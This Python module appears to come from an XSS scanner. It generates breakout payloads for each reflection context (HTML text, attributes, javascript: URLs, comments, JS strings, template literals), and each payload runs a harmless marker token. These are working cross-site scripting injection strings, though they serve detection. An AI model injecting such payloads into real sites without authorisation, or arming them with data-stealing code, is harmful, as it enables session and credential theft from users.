"""Builds one syntactically valid payload per detected reflection context."""

from __future__ import annotations

import uuid
from dataclasses import dataclass

from ..core.context import ReflectionContext


@dataclass(frozen=True)
class ContextPayload:
    context_type: str
    value: str        # exact string to inject into the parameter
    token: str          # unique marker embedded in `value`
    auto_fires: bool    # False only for "url_attribute"


def _token() -> str:
    return uuid.uuid4().hex[:12]


def generate_payload(context: ReflectionContext) -> ContextPayload | None:
    token = _token()
    marker = f"window.__xss_{token}__=1"

    if context.context_type == "html_text":
        value = f"<script>{marker}</script>"
    elif context.context_type == "html_attribute":
        if context.quote_char in ('"', "'"):
            q = context.quote_char
            value = f"{q} autofocus onfocus={q}{marker}"
        else:
            value = f" onfocus={marker} autofocus"
    elif context.context_type == "url_attribute":
        return ContextPayload("url_attribute", f"javascript:{marker}", token, auto_fires=False)
    elif context.context_type == "html_comment":
        value = f"--><script>{marker}</script><!--"
    elif context.context_type == "js_string":
        q = context.quote_char or '"'
        value = f"{q};{marker};//"
    elif context.context_type == "js_template_literal":
        value = "${(" + marker + ",'')}"
    else:  # "css", "unknown", or anything else not safely payload-able
        return None

    return ContextPayload(context.context_type, value, token, auto_fires=True)
